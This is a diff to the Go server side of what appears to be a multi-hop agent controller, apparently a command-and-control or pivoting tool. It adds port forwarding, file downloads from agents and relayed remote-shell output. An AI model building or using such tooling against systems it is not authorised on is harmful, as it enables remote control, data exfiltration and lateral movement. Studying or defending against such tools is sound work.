@@ -71,10 +71,12 @@ func handleConnection(conn net.Conn, registry *node.Registry) {
 		}
 		id := registry.Add(n)
 		log.Printf("[+] Registered agent ID %d - %s@%s (%s)", id, n.Username, n.Hostname, n.OS)
-
+		protocol.PrintPrompt()
+		protocol.Registry = registry
 		go handleAgentMessages(n, registry)
 	} else {
 		log.Println("[!] Unknown message type:", msg.Type)
+		protocol.PrintPrompt()
 		conn.Close()
 	}
 }
@@ -107,30 +109,110 @@ func handleAgentMessages(n *node.Node, registry *node.Registry) {
 		switch msg.Type {
 		case protocol.MsgResponse:
 			log.Printf("[#] Node %d response:\n%s", n.ID, string(msg.Payload))
+			protocol.PrintPrompt()
 		case protocol.MsgShell:
 			fmt.Print(string(msg.Payload))
+
+		// ------ Forward逻辑 ------
+
+		case protocol.MsgForwardData:
+			var payload protocol.ForwardDataPayload
+			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+				log.Printf("[-] ForwardData decode failed: %v", err)
+				break
+			}
+			conn, ok := protocol.GetForwardConn(payload.ConnID)
+			if !ok {
+				log.Printf("[-] ForwardConn %s not found", payload.ConnID)
+				break
+			}
+			_, err := conn.Write(payload.Data)
+			if err != nil {
+				log.Printf("[-] ForwardConn %s write failed: %v", payload.ConnID, err)
+				conn.Close()
+				protocol.RemoveForwardConn(payload.ConnID)
+			}
+
+		case protocol.MsgForwardStop:
+			var payload protocol.ForwardStopPayload
+			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+				log.Printf("[-] ForwardStop decode failed: %v", err)
+				break
+			}
+			conn, ok := protocol.GetForwardConn(payload.ConnID)
+			if ok {
+				conn.Close()
+				protocol.RemoveForwardConn(payload.ConnID)
+				log.Printf("[+] ForwardConn %s closed by agent", payload.ConnID)
+			}
+
+		// ------ Backward逻辑 ------
+		case protocol.MsgBackwardStart:
+			var payload protocol.BackwardStartPayload
+			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+				log.Printf("[-] BackwardStart decode failed: %v", err)
+				break
+			}
+			go protocol.HandleBackwardStart(payload.ConnID) // ✨注意用 goroutine 异步处理
+		case protocol.MsgBackwardData:
+			var payload protocol.BackwardDataPayload
+			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+				log.Printf("[-] BackwardData decode failed: %v", err)
+				break
+			}
+			log.Printf("[admin] ← MsgBackwardData for connID=%s, data.len=%d", payload.ConnID, len(payload.Data))
+
+			conn, ok := protocol.GetBackwardConn(payload.ConnID)
+			if !ok {
+				log.Printf("[-] BackwardConn %s not found", payload.ConnID)
+				break
+			}
+			_, err := conn.Write(payload.Data)
+			if err != nil {
+				log.Printf("[-] BackwardConn %s write failed: %v", payload.ConnID, err)
+				conn.Close()
+				protocol.RemoveBackwardConn(payload.ConnID)
+			}
+
+		case protocol.MsgBackwardStop:
+			connID := string(msg.Payload) // agent 直接发送 connID 字符串
+			conn, ok := protocol.GetBackwardConn(connID)
+			if ok {
+				conn.Close()
+				protocol.RemoveBackwardConn(connID)
+				log.Printf("[+] BackwardConn %s closed by agent", connID)
+			}
+			break
+
 		case protocol.MsgRelayReady:
 			var payload protocol.RelayReadyPayload
 			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
 				log.Printf("[-] RelayReady decode failed: %v", err)
+				protocol.PrintPrompt()
 				return
 			}
-			// nodeInfo, ok := registry.Get(payload.SelfID)
-			// ip := "(unknown)"
-			// if ok {
-			// 	ip = nodeInfo.Addr
-			// }
-			log.Printf("[Relay Ready] Node %d (%s) is now acting as relay ", payload.SelfID, payload.ListenAddr)
 
-			// 可选：标记该 node 为 relay（拓扑用途）
-			// if relayNode, ok := registry.Get(payload.SelfID); ok {
-			// 	// 如果你有 isRelay 字段，可在此设置
-			// 	log.Printf("[*] Relay node %d confirmed ready", payload.SelfID)
-			// }
+			log.Printf("[Relay Ready] Node %d (%s) is now acting as relay ", payload.SelfID, payload.ListenAddr)
+			protocol.PrintPrompt()
+		case protocol.MsgFileChunk:
+			var chunk protocol.FileChunk
+			if err := json.Unmarshal(msg.Payload, &chunk); err != nil {
+				log.Printf("[-] FileChunk decode failed: %v", err)
+				protocol.PrintPrompt()
+				return
+			}
+			protocol.OnFileChunk(chunk.Offset, chunk.Data)
+
+		case protocol.MsgDownloadDone:
+			log.Print("[+] Download complete.")
+			protocol.PrintPrompt()
+			protocol.OnDownloadDone()
+
 		case protocol.MsgRelayRegister:
 			var payload protocol.RelayRegisterPayload
 			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
 				log.Printf("[-] RelayRegister decode failed: %v", err)
+				protocol.PrintPrompt()
 				return
 			}
 
@@ -140,6 +222,7 @@ func handleAgentMessages(n *node.Node, registry *node.Registry) {
 			// 检查是否冲突
 			if _, exists := registry.Get(newID); exists {
 				log.Printf("[-] Duplicate node ID %d rejected", newID)
+				protocol.PrintPrompt()
 				resp := protocol.RelayAckPayload{Success: false, Message: "ID already exists"}
 				sendAck(n.Conn, protocol.MsgRelayError, resp)
 				return
@@ -149,78 +232,24 @@ func handleAgentMessages(n *node.Node, registry *node.Registry) {
 			registry.AddWithID(&newNode)
 			registry.NodeGraph.SetParent(newID, payload.ParentID)
 			log.Printf("[+] Registered relayed node ID %d under parent %d", newID, payload.ParentID)
-
+			protocol.PrintPrompt()
 			resp := protocol.RelayAckPayload{Success: true, Message: "Registered"}
 			sendAck(n.Conn, protocol.MsgRelayAck, resp)
-			// case protocol.MsgRelayPacket:
-			// 	var pkt protocol.RelayPacket
-			// 	if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
-			// 		log.Printf("[-] RelayPacket decode failed: %v", err)
-			// 		return
-			// 	}
-
-			// 	// 尝试解嵌套 Message
-			// 	innerMsg, err := protocol.DecodeMessage(pkt.Data)
-			// 	if err != nil {
-			// 		log.Printf("[-] Failed to decode inner message: %v", err)
-			// 		return
-			// 	}
-
-			// 	// ✅ 判断 inner 消息类型，决定是上传的“响应”，还是需要继续转发的“命令”
-			// 	switch innerMsg.Type {
-			// 	case protocol.MsgResponse, protocol.MsgShell:
-			// 		// 回传路径：打印结果
-			// 		switch innerMsg.Type {
-			// 		case protocol.MsgResponse:
-			// 			log.Printf("[#] Node %d response:\n%s", pkt.DestID, string(innerMsg.Payload))
-
-			// 		case protocol.MsgShell:
-			// 			fmt.Print(string(innerMsg.Payload))
-
-			// 		default:
-			// 			log.Printf("[-] Unknown inner message type from node %d: %s", pkt.DestID, innerMsg.Type)
-			// 		}
-			// 	default:
-			// 		// 下发路径：继续向目标 relay 转发
-			// 		parentID := registry.NodeGraph.GetParent(pkt.DestID)
-			// 		if parentID == -1 {
-			// 			log.Printf("[-] No parent found for dest ID %d", pkt.DestID)
-			// 			return
-			// 		}
-			// 		parentNode, ok := registry.Get(parentID)
-			// 		if !ok || parentNode.Conn == nil {
-			// 			log.Printf("[-] Cannot forward to %d: no relay node found", pkt.DestID)
-			// 			return
-			// 		}
-
-			// 		// 保留原始封装继续发送
-			// 		fwdMsg := protocol.Message{
-			// 			Type:    protocol.MsgRelayPacket,
-			// 			Payload: msg.Payload,
-			// 		}
-			// 		buf, err := protocol.EncodeMessage(fwdMsg)
-			// 		if err != nil {
-			// 			log.Printf("[-] Failed to encode relay forward: %v", err)
-			// 			return
-			// 		}
-			// 		_, err = parentNode.Conn.Write(buf)
-			// 		if err != nil {
-			// 			log.Printf("[-] Failed to relay to %d via %d: %v", pkt.DestID, parentID, err)
-			// 		}
-			// 	}
 
 		case protocol.MsgRelayPacket:
 			var pkt protocol.RelayPacket
 			if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
 				log.Printf("[-] RelayPacket decode failed: %v", err)
+				protocol.PrintPrompt()
 				return
 			}
-
+			log.Printf("[admin] RelayPacket received: dest=%d, data.len=%d", pkt.DestID, len(pkt.Data))
 			// ✅ 特殊情况：目标是 admin 本人（DestID == -1）
 			if pkt.DestID == -1 {
 				innerMsg, err := protocol.DecodeMessage(pkt.Data)
 				if err != nil {
 					log.Printf("[-] Failed to decode inner message to admin: %v", err)
+					protocol.PrintPrompt()
 					return
 				}
 				switch innerMsg.Type {
@@ -228,6 +257,7 @@ func handleAgentMessages(n *node.Node, registry *node.Registry) {
 					var payload protocol.RelayRegisterPayload
 					if err := json.Unmarshal(innerMsg.Payload, &payload); err != nil {
 						log.Printf("[-] RelayRegister decode failed: %v", err)
+						protocol.PrintPrompt()
 						return
 					}
 					newNode := payload.Node
@@ -235,6 +265,7 @@ func handleAgentMessages(n *node.Node, registry *node.Registry) {
 
 					if _, exists := registry.Get(newID); exists {
 						log.Printf("[-] Duplicate node ID %d rejected", newID)
+						protocol.PrintPrompt()
 						resp := protocol.RelayAckPayload{Success: false, Message: "ID already exists"}
 						sendAck(n.Conn, protocol.MsgRelayError, resp)
 						return
@@ -243,12 +274,14 @@ func handleAgentMessages(n *node.Node, registry *node.Registry) {
 					registry.AddWithID(&newNode)
 					registry.NodeGraph.SetParent(newID, payload.ParentID)
 					log.Printf("[+] Registered relayed node ID %d under parent %d", newID, payload.ParentID)
-
+					protocol.PrintPrompt()
 					resp := protocol.RelayAckPayload{Success: true, Message: "Registered"}
 					sendAck(n.Conn, protocol.MsgRelayAck, resp)
 
 				default:
 					log.Printf("[-] Unknown message type sent to admin: %s", innerMsg.Type)
+					protocol.PrintPrompt()
+					protocol.PrintPrompt()
 				}
 				return // ❗重要：处理完后不要再继续下发
 			}
@@ -257,24 +290,116 @@ func handleAgentMessages(n *node.Node, registry *node.Registry) {
 			innerMsg, err := protocol.DecodeMessage(pkt.Data)
 			if err != nil {
 				log.Printf("[-] Failed to decode inner message: %v", err)
+				protocol.PrintPrompt()
 				return
 			}
 
 			switch innerMsg.Type {
 			case protocol.MsgResponse:
 				log.Printf("[#] Node %d response:\n%s", pkt.DestID, string(innerMsg.Payload))
+				protocol.PrintPrompt()
 			case protocol.MsgShell:
 				fmt.Print(string(innerMsg.Payload))
+				protocol.PrintPrompt()
+			case protocol.MsgFileChunk:
+				fmt.Println("[+] Received file chunk from node", pkt.DestID)
+				var chunk protocol.FileChunk
+				if err := json.Unmarshal(innerMsg.Payload, &chunk); err != nil {
+					log.Println("[-] FileData decode failed:", err)
+					protocol.PrintPrompt()
+					return
+				}
+				protocol.OnFileChunk(chunk.Offset, chunk.Data)
+
+			case protocol.MsgDownloadDone:
+				log.Print("[+] Download complete.")
+				protocol.PrintPrompt()
+				protocol.OnDownloadDone()
+
+			// ------ Forward逻辑 ------
+
+			case protocol.MsgForwardData:
+				var payload protocol.ForwardDataPayload
+				if err := json.Unmarshal(innerMsg.Payload, &payload); err != nil {
+					log.Printf("[-] ForwardData decode failed: %v", err)
+					break
+				}
+				conn, ok := protocol.GetForwardConn(payload.ConnID)
+				if !ok {
+					log.Printf("[-] ForwardConn %s not found", payload.ConnID)
+					break
+				}
+				_, err := conn.Write(payload.Data)
+				if err != nil {
+					log.Printf("[-] ForwardConn %s write failed: %v", payload.ConnID, err)
+					conn.Close()
+					protocol.RemoveForwardConn(payload.ConnID)
+				}
+
+			case protocol.MsgForwardStop:
+				var payload protocol.ForwardStopPayload
+				if err := json.Unmarshal(innerMsg.Payload, &payload); err != nil {
+					log.Printf("[-] ForwardStop decode failed: %v", err)
+					break
+				}
+				conn, ok := protocol.GetForwardConn(payload.ConnID)
+				if ok {
+					conn.Close()
+					protocol.RemoveForwardConn(payload.ConnID)
+					log.Printf("[+] ForwardConn %s closed by agent", payload.ConnID)
+				}
+
+				// ------ Backward逻辑 ------
+
+			case protocol.MsgBackwardStart:
+				var payload protocol.BackwardStartPayload
+				if err := json.Unmarshal(innerMsg.Payload, &payload); err != nil {
+					log.Printf("[-] BackwardStart decode failed: %v", err)
+					break
+				}
+				protocol.HandleBackwardStart(payload.ConnID) // ✨注意用 goroutine 异步处理
+			case protocol.MsgBackwardData:
+				var payload protocol.BackwardDataPayload
+				if err := json.Unmarshal(innerMsg.Payload, &payload); err != nil {
+					log.Printf("[-] BackwardData decode failed: %v", err)
+					break
+				}
+				log.Printf("[admin] ← MsgBackwardData for connID=%s, data.len=%d", payload.ConnID, len(payload.Data))
+
+				conn, ok := protocol.GetBackwardConn(payload.ConnID)
+				if !ok {
+					log.Printf("[-] BackwardConn %s not found", payload.ConnID)
+					break
+				}
+
+				_, err := conn.Write(payload.Data)
+				if err != nil {
+					log.Printf("[-] BackwardConn %s write failed: %v", payload.ConnID, err)
+					conn.Close()
+					protocol.RemoveBackwardConn(payload.ConnID)
+				}
+
+			case protocol.MsgBackwardStop:
+				connID := string(innerMsg.Payload) // agent 直接发送 connID 字符串
+				conn, ok := protocol.GetBackwardConn(connID)
+				if ok {
+					conn.Close()
+					protocol.RemoveBackwardConn(connID)
+					log.Printf("[+] BackwardConn %s closed by agent", connID)
+				}
+
 			default:
 				// 向下 relay：找父节点继续下发
 				parentID := registry.NodeGraph.GetParent(pkt.DestID)
 				if parentID == -1 {
 					log.Printf("[-] No parent found for dest ID %d", pkt.DestID)
+					protocol.PrintPrompt()
 					return
 				}
 				parentNode, ok := registry.Get(parentID)
 				if !ok || parentNode.Conn == nil {
 					log.Printf("[-] Cannot forward to %d: no relay node found", pkt.DestID)
+					protocol.PrintPrompt()
 					return
 				}
 				fwdMsg := protocol.Message{
@@ -284,16 +409,19 @@ func handleAgentMessages(n *node.Node, registry *node.Registry) {
 				buf, err := protocol.EncodeMessage(fwdMsg)
 				if err != nil {
 					log.Printf("[-] Failed to encode relay forward: %v", err)
+					protocol.PrintPrompt()
 					return
 				}
 				_, err = parentNode.Conn.Write(buf)
 				if err != nil {
 					log.Printf("[-] Failed to relay to %d via %d: %v", pkt.DestID, parentID, err)
+					protocol.PrintPrompt()
 				}
 			}
 
 		default:
 			log.Printf("[-] Node %d sent unknown message type: %s", n.ID, msg.Type)
+			protocol.PrintPrompt()
 		}
 	}
 }
